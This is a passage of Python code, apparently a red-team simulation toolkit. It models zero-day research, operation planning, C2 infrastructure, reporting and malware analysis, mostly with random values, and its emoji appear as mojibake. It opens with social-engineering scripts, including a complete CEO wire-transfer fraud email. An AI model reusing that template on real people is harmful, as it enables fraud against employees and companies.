  your phone was also flagged. Let's fix this now."

CLOSING:
"Perfect, I've reset your credentials. You'll receive a new 
password shortly. Please change it immediately when you log in."
''',
            'executive': '''
üìß EXECUTIVE PRETEXT (BEC) SCRIPT
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ

EMAIL SUBJECT: Urgent - Wire Transfer Needed

BODY:
"[Target Name],

I'm in a meeting and can't talk, but I need you to process 
an urgent wire transfer for a new vendor we're onboarding.

Amount: $[Amount]
Account: [Attacker Account]
Reference: [Fake Reference]

Please handle this today and confirm when done. I'll explain 
when I'm back in office.

Thanks,
[CEO Name]

Sent from my iPhone"

FOLLOW-UP (if needed):
"Did you process that transfer? I'm getting pressure from the 
vendor. Please expedite."
'''
        }
        
        return scripts.get(pretext_type, f"No script template for {pretext_type}")


class ZeroDaySimulator:
    """Simulate zero-day vulnerability discovery and exploitation."""
    
    def __init__(self):
        self.vulnerability_patterns: Dict[str, Dict[str, Any]] = {
            'memory_corruption': {
                'subtypes': ['buffer_overflow', 'heap_overflow', 'use_after_free', 'double_free'],
                'target_languages': ['C', 'C++'],
                'exploitation_difficulty': 'high',
                'typical_impact': 'code_execution',
                'mitigations': ['ASLR', 'DEP', 'Stack Canaries', 'CFI']
            },
            'logic_flaw': {
                'subtypes': ['authentication_bypass', 'authorization_bypass', 'race_condition'],
                'target_languages': ['any'],
                'exploitation_difficulty': 'medium',
                'typical_impact': 'privilege_escalation',
                'mitigations': ['Code review', 'Security testing']
            },
            'injection': {
                'subtypes': ['sql_injection', 'command_injection', 'template_injection'],
                'target_languages': ['PHP', 'Python', 'Java', 'Ruby'],
                'exploitation_difficulty': 'low',
                'typical_impact': 'code_execution',
                'mitigations': ['Input validation', 'Parameterized queries', 'WAF']
            },
            'deserialization': {
                'subtypes': ['java_deserialization', 'php_deserialization', 'pickle_deserialization'],
                'target_languages': ['Java', 'PHP', 'Python'],
                'exploitation_difficulty': 'medium',
                'typical_impact': 'code_execution',
                'mitigations': ['Type checking', 'Avoid deserializing untrusted data']
            },
            'type_confusion': {
                'subtypes': ['javascript_type_confusion', 'jit_bugs'],
                'target_languages': ['JavaScript', 'Java'],
                'exploitation_difficulty': 'very_high',
                'typical_impact': 'sandbox_escape',
                'mitigations': ['Type safety', 'JIT hardening']
            }
        }
        
        self.discovered_vulns: List[Dict[str, Any]] = []
        self.exploit_development_phases = [
            'Vulnerability Discovery',
            'Root Cause Analysis',
            'Proof of Concept',
            'Reliability Engineering',
            'Weaponization',
            'Testing & Validation'
        ]
        
    def simulate_fuzzing_campaign(self, target: str, 
                                  duration_hours: int) -> Dict[str, Any]:
        """Simulate a fuzzing campaign."""
        # Simulate fuzzing results
        crashes_found = random.randint(0, duration_hours * 5)
        unique_crashes = int(crashes_found * 0.3)
        exploitable = int(unique_crashes * 0.2)
        
        return {
            'target': target,
            'duration_hours': duration_hours,
            'total_crashes': crashes_found,
            'unique_crashes': unique_crashes,
            'potentially_exploitable': exploitable,
            'crash_types': {
                'null_pointer': random.randint(0, unique_crashes),
                'buffer_overflow': random.randint(0, unique_crashes // 2),
                'use_after_free': random.randint(0, unique_crashes // 4),
                'assertion_failure': random.randint(0, unique_crashes)
            },
            'recommended_analysis': [
                f"Triage {unique_crashes} unique crashes",
                f"Prioritize {exploitable} potentially exploitable bugs",
                "Develop minimized test cases",
                "Perform root cause analysis"
            ]
        }
    
    def simulate_vulnerability_research(self, target_component: str,
                                        vuln_class: str) -> Dict[str, Any]:
        """Simulate vulnerability research process."""
        vuln_info = self.vulnerability_patterns.get(vuln_class, {})
        
        # Simulate research outcome
        discovery_probability = {
            'low': 0.1, 'medium': 0.3, 'high': 0.5, 'very_high': 0.05
        }.get(vuln_info.get('exploitation_difficulty', 'medium'), 0.2)
        
        found = random.random() < discovery_probability
        
        result = {
            'target': target_component,
            'vuln_class': vuln_class,
            'research_successful': found,
            'hours_spent': random.randint(40, 200),
            'analysis_depth': 'deep'
        }
        
        if found:
            vuln_id = f"0DAY-{len(self.discovered_vulns)+1:04d}"
            vuln_record = {
                'id': vuln_id,
                'target': target_component,
                'class': vuln_class,
                'subtype': random.choice(vuln_info.get('subtypes', ['unknown'])),
                'impact': vuln_info.get('typical_impact', 'unknown'),
                'discovered_at': datetime.now().isoformat(),
                'exploitation_difficulty': vuln_info.get('exploitation_difficulty', 'medium'),
                'exploit_development_status': 'not_started',
                'bypasses_mitigations': random.sample(vuln_info.get('mitigations', []), 
                                                     min(2, len(vuln_info.get('mitigations', []))))
            }
            
            self.discovered_vulns.append(vuln_record)
            result['vulnerability'] = vuln_record
            result['next_steps'] = [
                "Develop proof of concept",
                "Determine reliability",
                "Assess mitigation bypasses",
                "Evaluate disclosure timeline"
            ]
        else:
            result['findings'] = [
                "No exploitable vulnerabilities found",
                "Code quality appears reasonable",
                "Consider different attack surface"
            ]
            
        return result
    
    def simulate_exploit_development(self, vuln_id: str) -> Dict[str, Any]:
        """Simulate exploit development process."""
        vuln = next((v for v in self.discovered_vulns if v['id'] == vuln_id), None)
        
        if not vuln:
            return {'error': 'Vulnerability not found'}
            
        difficulty = vuln.get('exploitation_difficulty', 'medium')
        time_multiplier = {'low': 1, 'medium': 2, 'high': 4, 'very_high': 8}.get(difficulty, 2)
        
        phases_status = []
        current_phase = random.randint(1, 6)
        
        for i, phase in enumerate(self.exploit_development_phases):
            if i < current_phase:
                phases_status.append({'phase': phase, 'status': 'completed'})
            elif i == current_phase:
                phases_status.append({'phase': phase, 'status': 'in_progress'})
            else:
                phases_status.append({'phase': phase, 'status': 'pending'})
        
        return {
            'vulnerability_id': vuln_id,
            'development_status': phases_status,
            'current_phase': self.exploit_development_phases[current_phase],
            'estimated_hours_remaining': (6 - current_phase) * 20 * time_multiplier,
            'reliability': f"{min(95, 50 + current_phase * 10)}%",
            'challenges': [
                "ASLR bypass needed",
                "Heap layout manipulation required",
                "Race condition timing critical"
            ] if current_phase < 4 else ["Finalizing reliability", "Cross-platform testing"],
            'artifacts_produced': [
                "Crash PoC" if current_phase >= 1 else None,
                "Code execution PoC" if current_phase >= 3 else None,
                "Reliable exploit" if current_phase >= 5 else None
            ]
        }


class RedTeamOperationPlanner:
    """Full-scale red team operation planning and execution tracking."""
    
    def __init__(self):
        self.operations: Dict[str, Dict[str, Any]] = {}
        self.engagement_types = {
            'full_scope': {
                'name': 'Full Scope Red Team',
                'duration_weeks': 8,
                'includes': ['external', 'internal', 'physical', 'social_engineering'],
                'objectives': ['breach_simulation', 'critical_asset_access']
            },
            'assumed_breach': {
                'name': 'Assumed Breach',
                'duration_weeks': 4,
                'includes': ['internal', 'privilege_escalation', 'lateral_movement'],
                'objectives': ['domain_compromise', 'data_exfiltration']
            },
            'purple_team': {
                'name': 'Purple Team Exercise',
                'duration_weeks': 2,
                'includes': ['collaborative_testing', 'detection_validation'],
                'objectives': ['improve_detection', 'validate_controls']
            },
            'adversary_simulation': {
                'name': 'Adversary Simulation',
                'duration_weeks': 6,
                'includes': ['threat_actor_emulation', 'ttp_coverage'],
                'objectives': ['threat_resilience', 'gap_identification']
            },
            'physical': {
                'name': 'Physical Penetration Test',
                'duration_weeks': 2,
                'includes': ['facility_access', 'badge_cloning', 'tailgating'],
                'objectives': ['physical_access', 'device_implant']
            }
        }
        
        self.kill_chain_phases = [
            'Reconnaissance',
            'Resource Development',
            'Initial Access',
            'Execution',
            'Persistence',
            'Privilege Escalation',
            'Defense Evasion',
            'Credential Access',
            'Discovery',
            'Lateral Movement',
            'Collection',
            'Command and Control',
            'Exfiltration',
            'Impact'
        ]
        
    def create_operation(self, name: str, engagement_type: str,
                        client: str, objectives: List[str],
                        scope: Dict[str, Any]) -> str:
        """Create a new red team operation."""
        op_id = f"RTOP-{len(self.operations)+1:04d}"
        eng_type = self.engagement_types.get(engagement_type, {})
        
        self.operations[op_id] = {
            'id': op_id,
            'name': name,
            'client': client,
            'engagement_type': engagement_type,
            'engagement_info': eng_type,
            'objectives': objectives,
            'scope': scope,
            'created_at': datetime.now().isoformat(),
            'status': 'planning',
            'phases': self._create_phase_plan(engagement_type),
            'team_members': [],
            'findings': [],
            'kill_chain_progress': {phase: 'not_started' for phase in self.kill_chain_phases},
            'c2_infrastructure': [],
            'compromised_assets': [],
            'collected_credentials': 0,
            'detection_events': 0
        }
        
        return op_id
    
    def _create_phase_plan(self, engagement_type: str) -> List[Dict[str, Any]]:
        """Create phase plan based on engagement type."""
        eng_type = self.engagement_types.get(engagement_type, {})
        duration_weeks = eng_type.get('duration_weeks', 4)
        
        phases = [
            {
                'phase': 'Planning & Reconnaissance',
                'week_start': 1,
                'week_end': 1,
                'activities': ['Rules of Engagement', 'Scope validation', 'OSINT'],
                'status': 'not_started'
            },
            {
                'phase': 'Infrastructure Setup',
                'week_start': 1,
                'week_end': 1,
                'activities': ['C2 setup', 'Domain registration', 'Payload development'],
                'status': 'not_started'
            },
            {
                'phase': 'Initial Access',
                'week_start': 2,
                'week_end': int(duration_weeks * 0.3),
                'activities': ['Phishing', 'External exploitation', 'Physical access'],
                'status': 'not_started'
            },
            {
                'phase': 'Post-Exploitation',
                'week_start': int(duration_weeks * 0.3),
                'week_end': int(duration_weeks * 0.7),
                'activities': ['Privilege escalation', 'Lateral movement', 'Persistence'],
                'status': 'not_started'
            },
            {
                'phase': 'Objective Completion',
                'week_start': int(duration_weeks * 0.7),
                'week_end': int(duration_weeks * 0.9),
                'activities': ['Critical asset access', 'Data exfiltration', 'Impact demonstration'],
                'status': 'not_started'
            },
            {
                'phase': 'Reporting & Debrief',
                'week_start': int(duration_weeks * 0.9),
                'week_end': duration_weeks,
                'activities': ['Finding documentation', 'Report writing', 'Debrief session'],
                'status': 'not_started'
            }
        ]
        
        return phases
    
    def update_kill_chain_progress(self, op_id: str, phase: str, 
                                   status: str) -> bool:
        """Update kill chain phase status."""
        if op_id in self.operations and phase in self.kill_chain_phases:
            self.operations[op_id]['kill_chain_progress'][phase] = status
            return True
        return False
    
    def add_finding(self, op_id: str, title: str, severity: str,
                   description: str, evidence: str,
                   affected_assets: List[str]) -> str:
        """Add a finding to the operation."""
        if op_id not in self.operations:
            return ""
            
        finding_id = f"FIND-{len(self.operations[op_id]['findings'])+1:04d}"
        
        self.operations[op_id]['findings'].append({
            'id': finding_id,
            'title': title,
            'severity': severity,  # critical, high, medium, low, informational
            'description': description,
            'evidence': evidence,
            'affected_assets': affected_assets,
            'discovered_at': datetime.now().isoformat(),
            'kill_chain_phase': None,
            'mitre_techniques': [],
            'remediation': ''
        })
        
        return finding_id
    
    def get_operation_dashboard(self, op_id: str) -> Dict[str, Any]:
        """Get operation dashboard data."""
        op = self.operations.get(op_id)
        if not op:
            return {'error': 'Operation not found'}
            
        # Calculate kill chain coverage
        completed_phases = sum(1 for status in op['kill_chain_progress'].values() 
                              if status == 'completed')
        in_progress = sum(1 for status in op['kill_chain_progress'].values() 
                         if status == 'in_progress')
        
        # Count findings by severity
        severity_counts = {}
        for finding in op['findings']:
            sev = finding['severity']
            severity_counts[sev] = severity_counts.get(sev, 0) + 1
        
        return {
            'operation_id': op_id,
            'name': op['name'],
            'status': op['status'],
            'kill_chain_coverage': f"{completed_phases}/{len(self.kill_chain_phases)}",
            'phases_in_progress': in_progress,
            'findings_count': len(op['findings']),
            'findings_by_severity': severity_counts,
            'compromised_assets': len(op['compromised_assets']),
            'credentials_collected': op['collected_credentials'],
            'detection_events': op['detection_events'],
            'current_phase': next((p['phase'] for p in op['phases'] 
                                  if p['status'] == 'in_progress'), 'Planning')
        }
    
    def generate_executive_summary(self, op_id: str) -> str:
        """Generate executive summary for operation."""
        op = self.operations.get(op_id)
        if not op:
            return "Operation not found"
            
        dashboard = self.get_operation_dashboard(op_id)
        
        lines = [
            "=" * 70,
            "üéØ RED TEAM OPERATION - EXECUTIVE SUMMARY",
            "=" * 70,
            "",
            f"Operation: {op['name']}",
            f"Client: {op['client']}",
            f"Engagement Type: {op['engagement_type'].replace('_', ' ').title()}",
            f"Status: {op['status'].upper()}",
            "",
            "üìä KEY METRICS",
            "‚îÄ" * 40,
            f"   Kill Chain Coverage: {dashboard['kill_chain_coverage']} phases completed",
            f"   Assets Compromised: {dashboard['compromised_assets']}",
            f"   Credentials Harvested: {dashboard['credentials_collected']}",
            f"   Detection Events: {dashboard['detection_events']}",
            "",
            "üîç FINDINGS SUMMARY",
            "‚îÄ" * 40
        ]
        
        for sev, count in dashboard['findings_by_severity'].items():
            icons = {'critical': 'üî¥', 'high': 'üü†', 'medium': 'üü°', 'low': 'üü¢', 'informational': 'üîµ'}
            lines.append(f"   {icons.get(sev, '‚ö™')} {sev.upper()}: {count}")
        
        lines.extend([
            "",
            "üéØ OBJECTIVES STATUS",
            "‚îÄ" * 40
        ])
        
        for obj in op['objectives']:
            lines.append(f"   ‚¨ú {obj}")
        
        lines.extend([
            "",
            "=" * 70,
            "This summary is for authorized personnel only.",
            "=" * 70
        ])
        
        return "\n".join(lines)


class AdvancedC2Simulator:
    """Advanced Command and Control infrastructure simulation."""
    
    def __init__(self):
        self.c2_profiles: Dict[str, Dict[str, Any]] = {
            'cobalt_strike': {
                'name': 'Cobalt Strike',
                'type': 'commercial',
                'protocols': ['http', 'https', 'dns', 'smb'],
                'malleable_c2': True,
                'detection_signatures': 'high',
                'lateral_movement': True
            },
            'mythic': {
                'name': 'Mythic',
                'type': 'open_source',
                'protocols': ['http', 'https', 'websocket'],
                'extensible': True,
                'detection_signatures': 'medium'
            },
            'sliver': {
                'name': 'Sliver',
                'type': 'open_source',
                'protocols': ['http', 'https', 'mtls', 'wg', 'dns'],
                'detection_signatures': 'low',
                'implant_types': ['session', 'beacon']
            },
            'covenant': {
                'name': 'Covenant',
                'type': 'open_source',
                'protocols': ['http', 'https'],
                'dotnet_based': True,
                'detection_signatures': 'medium'
            },
            'havoc': {
                'name': 'Havoc',
                'type': 'open_source',
                'protocols': ['http', 'https'],
                'demon_implant': True,
                'detection_signatures': 'low'
            },
            'custom': {
                'name': 'Custom C2',
                'type': 'custom',
                'protocols': ['configurable'],
                'detection_signatures': 'very_low'
            }
        }
        
        self.infrastructure: Dict[str, Dict[str, Any]] = {}
        self.redirectors: List[Dict[str, Any]] = []
        self.implants: Dict[str, Dict[str, Any]] = {}
        
    def setup_infrastructure(self, c2_type: str, team_server_ip: str,
                            domain: str, redirector_count: int = 2) -> str:
        """Set up C2 infrastructure."""
        infra_id = f"C2-{len(self.infrastructure)+1:04d}"
        profile = self.c2_profiles.get(c2_type, {})
        
        self.infrastructure[infra_id] = {
            'id': infra_id,
            'c2_type': c2_type,
            'profile': profile,
            'team_server': team_server_ip,
            'domain': domain,
            'created_at': datetime.now().isoformat(),
            'status': 'active',
            'listeners': [],
            'redirectors': [],
            'implant_count': 0,
            'callbacks_today': 0
        }
        
        # Set up redirectors
        for i in range(redirector_count):
            redirector = {
                'id': f"{infra_id}-REDIR-{i+1:02d}",
                'type': 'nginx' if i % 2 == 0 else 'apache',
                'ip': f"10.0.{i+1}.1",  # Placeholder
                'status': 'active',
                'traffic_forwarded': 0
            }
            self.infrastructure[infra_id]['redirectors'].append(redirector)
        
        return infra_id
    
    def create_listener(self, infra_id: str, protocol: str, port: int,
                       host: str, profile_name: str = None) -> str:
        """Create a C2 listener."""
        if infra_id not in self.infrastructure:
            return ""
            
        listener_id = f"LISTEN-{len(self.infrastructure[infra_id]['listeners'])+1:04d}"
        
        listener = {
            'id': listener_id,
            'protocol': protocol,
            'port': port,
            'host': host,
            'profile': profile_name,
            'created_at': datetime.now().isoformat(),
            'status': 'listening',
            'connections': 0
        }
        
        self.infrastructure[infra_id]['listeners'].append(listener)
        return listener_id
    
    def register_implant(self, infra_id: str, hostname: str, 
                        username: str, os_info: str,
                        process_name: str, pid: int) -> str:
        """Register a new implant callback."""
        implant_id = f"IMPLANT-{len(self.implants)+1:05d}"
        
        self.implants[implant_id] = {
            'id': implant_id,
            'infrastructure_id': infra_id,
            'hostname': hostname,
            'username': username,
            'os': os_info,
            'process': process_name,
            'pid': pid,
            'first_callback': datetime.now().isoformat(),
            'last_callback': datetime.now().isoformat(),
            'status': 'active',
            'sleep_interval': 60,
            'jitter': 0.2,
            'tasks_queued': [],
            'tasks_completed': []
        }
        
        if infra_id in self.infrastructure:
            self.infrastructure[infra_id]['implant_count'] += 1
            self.infrastructure[infra_id]['callbacks_today'] += 1
        
        return implant_id
    
    def queue_task(self, implant_id: str, task_type: str, 
                  parameters: Dict[str, Any]) -> str:
        """Queue a task for an implant."""
        if implant_id not in self.implants:
            return ""
            
        task_id = f"TASK-{len(self.implants[implant_id]['tasks_queued'])+1:06d}"
        
        task = {
            'id': task_id,
            'type': task_type,
            'parameters': parameters,
            'queued_at': datetime.now().isoformat(),
            'status': 'queued',
            'result': None
        }
        
        self.implants[implant_id]['tasks_queued'].append(task)
        return task_id
    
    def get_beacon_graph(self) -> str:
        """Generate ASCII visualization of beacon network."""
        lines = [
            "=" * 70,
            "üåê C2 BEACON NETWORK",
            "=" * 70,
            ""
        ]
        
        for infra_id, infra in self.infrastructure.items():
            lines.append(f"üñ•Ô∏è TEAM SERVER: {infra['team_server']} ({infra['c2_type']})")
            lines.append(f"   Domain: {infra['domain']}")
            lines.append("   ‚îÇ")
            
            for redir in infra['redirectors']:
                status_icon = '‚úÖ' if redir['status'] == 'active' else '‚ùå'
                lines.append(f"   ‚îú‚îÄ {status_icon} Redirector: {redir['ip']} ({redir['type']})")
            
            lines.append("   ‚îÇ")
            
            # Show implants for this infrastructure
            infra_implants = [imp for imp in self.implants.values() 
                            if imp['infrastructure_id'] == infra_id]
            
            for imp in infra_implants[:10]:  # Limit display
                status_icon = 'üü¢' if imp['status'] == 'active' else 'üî¥'
                lines.append(f"   ‚îî‚îÄ {status_icon} {imp['hostname']}\\{imp['username']}")
                lines.append(f"      ‚îî‚îÄ {imp['process']} (PID: {imp['pid']})")
            
            if len(infra_implants) > 10:
                lines.append(f"   ‚îî‚îÄ ... and {len(infra_implants)-10} more implants")
            
            lines.append("")
        
        lines.extend([
            "=" * 70,
            f"Total Implants: {len(self.implants)} | Active: {sum(1 for i in self.implants.values() if i['status'] == 'active')}",
            "=" * 70
        ])
        
        return "\n".join(lines)


class AdvancedReportGenerator:
    """Generate comprehensive penetration test and red team reports."""
    
    def __init__(self):
        self.report_templates = {
            'pentest': {
                'sections': [
                    'Executive Summary',
                    'Scope and Methodology',
                    'Risk Summary',
                    'Detailed Findings',
                    'Remediation Recommendations',
                    'Appendices'
                ]
            },
            'red_team': {
                'sections': [
                    'Executive Summary',
                    'Engagement Overview',
                    'Attack Narrative',
                    'Kill Chain Analysis',
                    'Detection and Response Analysis',
                    'Findings and Recommendations',
                    'Appendices'
                ]
            },
            'vulnerability': {
                'sections': [
                    'Executive Summary',
                    'Scope',
                    'Vulnerability Statistics',
                    'Detailed Findings',
                    'Remediation Prioritization',
                    'Appendices'
                ]
            }
        }
        
        self.severity_definitions = {
            'critical': {
                'cvss_range': '9.0 - 10.0',
                'description': 'Immediate exploitation likely, severe business impact',
                'remediation_timeline': 'Immediate (24-48 hours)',
                'color': '#FF0000'
            },
            'high': {
                'cvss_range': '7.0 - 8.9',
                'description': 'Exploitation likely, significant business impact',
                'remediation_timeline': '7 days',
                'color': '#FF8C00'
            },
            'medium': {
                'cvss_range': '4.0 - 6.9',
                'description': 'Exploitation possible, moderate business impact',
                'remediation_timeline': '30 days',
                'color': '#FFD700'
            },
            'low': {
                'cvss_range': '0.1 - 3.9',
                'description': 'Exploitation unlikely, minimal business impact',
                'remediation_timeline': '90 days',
                'color': '#32CD32'
            },
            'informational': {
                'cvss_range': 'N/A',
                'description': 'Best practice recommendation, no direct risk',
                'remediation_timeline': 'As resources permit',
                'color': '#4169E1'
            }
        }
        
    def generate_finding_writeup(self, finding: Dict[str, Any]) -> str:
        """Generate detailed finding writeup."""
        sev_info = self.severity_definitions.get(finding.get('severity', 'medium'), {})
        
        writeup = f"""
## {finding.get('title', 'Untitled Finding')}

**Severity:** {finding.get('severity', 'Medium').upper()}
**CVSS Score:** {finding.get('cvss', 'N/A')}
**Affected Assets:** {', '.join(finding.get('affected_assets', ['N/A']))}
**MITRE ATT&CK:** {', '.join(finding.get('mitre_techniques', ['N/A']))}

### Description
{finding.get('description', 'No description provided.')}

### Technical Details
{finding.get('technical_details', 'No technical details provided.')}

### Evidence
```
{finding.get('evidence', 'No evidence provided.')}
```

### Impact
{finding.get('impact', sev_info.get('description', 'Impact not specified.'))}

### Remediation
**Timeline:** {sev_info.get('remediation_timeline', '30 days')}

{finding.get('remediation', 'Remediation steps not provided.')}

### References
{chr(10).join('- ' + ref for ref in finding.get('references', ['No references provided.']))}
"""
        return writeup
    
    def generate_attack_narrative(self, attack_chain: List[Dict[str, Any]]) -> str:
        """Generate attack narrative from chain steps."""
        lines = [
            "# Attack Narrative",
            "",
            "This section describes the attack path taken during the engagement, "
            "presented as a chronological narrative.",
            ""
        ]
        
        for i, step in enumerate(attack_chain, 1):
            lines.extend([
                f"## Phase {i}: {step.get('phase', 'Unknown Phase')}",
                "",
                f"**Timestamp:** {step.get('timestamp', 'N/A')}",
                f"**Technique:** {step.get('technique', 'N/A')} ({step.get('technique_id', 'N/A')})",
                "",
                f"{step.get('description', 'No description provided.')}",
                "",
                "**Actions Taken:**",
                ""
            ])
            
            for action in step.get('actions', []):
                lines.append(f"- {action}")
            
            lines.extend([
                "",
                f"**Outcome:** {step.get('outcome', 'N/A')}",
                "",
                "---",
                ""
            ])
        
        return "\n".join(lines)
    
    def generate_executive_summary(self, engagement_data: Dict[str, Any]) -> str:
        """Generate executive summary."""
        summary = f"""
# Executive Summary

## Engagement Overview

**Client:** {engagement_data.get('client', 'N/A')}
**Assessment Type:** {engagement_data.get('type', 'Penetration Test')}
**Testing Period:** {engagement_data.get('start_date', 'N/A')} to {engagement_data.get('end_date', 'N/A')}
**Consultant(s):** {', '.join(engagement_data.get('consultants', ['N/A']))}

## Key Findings Summary

{engagement_data.get('summary', 'The assessment identified several security vulnerabilities...')}

### Finding Statistics

| Severity | Count |
|----------|-------|
| Critical | {engagement_data.get('findings', {}).get('critical', 0)} |
| High | {engagement_data.get('findings', {}).get('high', 0)} |
| Medium | {engagement_data.get('findings', {}).get('medium', 0)} |
| Low | {engagement_data.get('findings', {}).get('low', 0)} |
| Informational | {engagement_data.get('findings', {}).get('informational', 0)} |

## Overall Risk Assessment

**Risk Level:** {engagement_data.get('overall_risk', 'HIGH')}

{engagement_data.get('risk_summary', 'Based on the findings...')}

## Top Recommendations

"""
        for i, rec in enumerate(engagement_data.get('recommendations', [])[:5], 1):
            summary += f"{i}. {rec}\n"
        
        return summary
    
    def generate_remediation_roadmap(self, 
                                     findings: List[Dict[str, Any]]) -> str:
        """Generate remediation roadmap."""
        lines = [
            "# Remediation Roadmap",
            "",
            "This roadmap prioritizes remediation efforts based on risk and effort.",
            ""
        ]
        
        # Group by timeline
        immediate = []
        week = []
        month = []
        quarter = []
        
        for finding in findings:
            sev = finding.get('severity', 'medium')
            if sev == 'critical':
                immediate.append(finding)
            elif sev == 'high':
                week.append(finding)
            elif sev == 'medium':
                month.append(finding)
            else:
                quarter.append(finding)
        
        sections = [
            ("## Immediate (24-48 hours)", immediate),
            ("## Short-term (7 days)", week),
            ("## Medium-term (30 days)", month),
            ("## Long-term (90 days)", quarter)
        ]
        
        for header, items in sections:
            if items:
                lines.append(header)
                lines.append("")
                for item in items:
                    lines.append(f"- [ ] **{item.get('title', 'Untitled')}** - {item.get('remediation', 'See details')[:100]}")
                lines.append("")
        
        return "\n".join(lines)


class MalwareAnalysisEngine:
    """Static and dynamic malware analysis simulation."""
    
    def __init__(self):
        self.analysis_techniques: Dict[str, Dict[str, Any]] = {
            'static': {
                'file_hashing': {'tools': ['md5sum', 'sha256sum', 'ssdeep']},
                'string_extraction': {'tools': ['strings', 'floss']},
                'pe_analysis': {'tools': ['pefile', 'pestudio', 'pe-bear']},
                'disassembly': {'tools': ['ghidra', 'ida', 'radare2']},
                'decompilation': {'tools': ['ghidra', 'ida-hexrays', 'retdec']},
                'yara_scanning': {'tools': ['yara', 'yara-x']},
                'signature_matching': {'tools': ['clamav', 'virustotal']}
            },
            'dynamic': {
                'behavioral_analysis': {'tools': ['cuckoo', 'cape', 'any.run']},
                'network_monitoring': {'tools': ['wireshark', 'fakenet']},
                'api_monitoring': {'tools': ['api_monitor', 'procmon']},
                'memory_analysis': {'tools': ['volatility', 'rekall']},
                'debugging': {'tools': ['x64dbg', 'windbg', 'gdb']}
            }
        }
        
        self.malware_families: Dict[str, Dict[str, Any]] = {
            'ransomware': {
                'behaviors': ['file_encryption', 'shadow_copy_deletion', 'ransom_note'],
                'examples': ['LockBit', 'BlackCat', 'Conti', 'REvil']
            },
            'rat': {
                'behaviors': ['keylogging', 'screen_capture', 'file_exfil', 'remote_shell'],
                'examples': ['Emotet', 'TrickBot', 'Cobalt Strike', 'Quasar']
            },
            'infostealer': {
                'behaviors': ['browser_credential_theft', 'crypto_wallet_theft', 'clipboard_hijack'],
                'examples': ['RedLine', 'Raccoon', 'Vidar']
            },
            'botnet': {
                'behaviors': ['ddos', 'spam', 'cryptomining', 'proxy'],
                'examples': ['Mirai', 'QakBot', 'Necurs']
            },
            'rootkit': {
                'behaviors': ['kernel_hooking', 'process_hiding', 'file_hiding'],
                'examples': ['Necurs', 'TDL', 'ZeroAccess']
            }
        }
        
        self.samples: Dict[str, Dict[str, Any]] = {}
        
    def analyze_sample(self, sample_hash: str, sample_name: str) -> Dict[str, Any]:
        """Perform simulated analysis on a malware sample."""
        sample_id = f"MAL-{len(self.samples)+1:05d}"
        
        # Simulate static analysis results
        static_results = {
            'hashes': {
                'md5': sample_hash[:32] if len(sample_hash) >= 32 else sample_hash,
                'sha256': sample_hash,
                'ssdeep': f"{random.randint(100,999)}:{random.randint(10,99)}:..."
            },
            'file_type': random.choice(['PE32', 'PE64', 'ELF', 'Mach-O', 'Script']),
            'file_size': random.randint(10000, 5000000),
            'entropy': round(random.uniform(6.5, 7.9), 2),
            'packed': random.random() > 0.6,
            'packer': 'UPX' if random.random() > 0.7 else None,
            'imports': {
                'suspicious': random.randint(5, 20),
                'total': random.randint(50, 200)
            },
            'strings_of_interest': [
                'http://malicious.com/beacon',
                'cmd.exe /c',
                'powershell -enc',
                'CreateRemoteThread',
                'VirtualAllocEx'
            ][:random.randint(2, 5)]
        }
        
        # Simulate dynamic analysis results  
        dynamic_results = {
            'processes_created': random.randint(1, 5),
            'files_created': random.randint(0, 10),
            'files_modified': random.randint(0, 20),
            'registry_modified': random.randint(0, 15),
            'network_connections': random.randint(1, 8),
            'dns_queries': [
                'malware-c2.com',
                'exfil-data.net'
            ][:random.randint(0, 2)],
            'behaviors_detected': random.sample([
                'persistence',
                'defense_evasion',
                'credential_access',
                'discovery',
                'lateral_movement',
                'collection',
                'command_and_control',
                'exfiltration'
            ], random.randint(2, 5))
        }
        
        # Determine likely malware family
        family_match = random.choice(list(self.malware_families.keys()))
        confidence = random.uniform(0.6, 0.95)
        
        analysis = {
            'sample_id': sample_id,
            'sample_name': sample_name,
            'sample_hash': sample_hash,
            'analyzed_at': datetime.now().isoformat(),
            'static_analysis': static_results,
            'dynamic_analysis': dynamic_results,
            'classification': {
                'family': family_match,
                'confidence': confidence,
                'variant': f"{self.malware_families[family_match]['examples'][0]}.variant"
            },
            'threat_score': random.randint(70, 100),
            'iocs_extracted': {
                'domains': dynamic_results['dns_queries'],
                'ips': [f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}" 
                       for _ in range(random.randint(1, 3))],
                'file_hashes': [sample_hash],
                'mutexes': [f"Global\\{sample_name[:8]}Mutex"],
                'registry_keys': [r'HKCU\Software\Microsoft\Windows\CurrentVersion\Run']
            },
            'mitre_techniques': random.sample([
                'T1055', 'T1059', 'T1003', 'T1547', 'T1027', 
                'T1082', 'T1083', 'T1071', 'T1105', 'T1486'
            ], random.randint(3, 6))
        }
        
        self.samples[sample_id] = analysis
        return analysis
    
    def generate_analysis_report(self, sample_id: str) -> str:
        """Generate malware analysis report."""
        sample = self.samples.get(sample_id)
        if not sample:
            return "Sample not found"
            
        lines = [
            "=" * 70,
            "üî¨ MALWARE ANALYSIS REPORT",
            "=" * 70,
            "",
            f"Sample ID: {sample['sample_id']}",
            f"Sample Name: {sample['sample_name']}",
            f"Analysis Date: {sample['analyzed_at']}",
            "",
            "üìä THREAT ASSESSMENT",
            "‚îÄ" * 40,
            f"Threat Score: {sample['threat_score']}/100",
            f"Classification: {sample['classification']['family'].upper()}",
            f"Variant: {sample['classification']['variant']}",
            f"Confidence: {sample['classification']['confidence']*100:.1f}%",
            "",
            "üìÅ FILE INFORMATION",
            "‚îÄ" * 40,
            f"MD5: {sample['static_analysis']['hashes']['md5']}",
            f"SHA256: {sample['static_analysis']['hashes']['sha256']}",
            f"File Type: {sample['static_analysis']['file_type']}",
            f"Size: {sample['static_analysis']['file_size']:,} bytes",
            f"Entropy: {sample['static_analysis']['entropy']}",
            f"Packed: {'Yes - ' + sample['static_analysis']['packer'] if sample['static_analysis']['packed'] else 'No'}",
            "",
            "üîç BEHAVIORAL INDICATORS",
            "‚îÄ" * 40
        ]
        
        for behavior in sample['dynamic_analysis']['behaviors_detected']:
            lines.append(f"   ‚Ä¢ {behavior.replace('_', ' ').title()}")
        
        lines.extend([
            "",
            "üåê NETWORK INDICATORS",
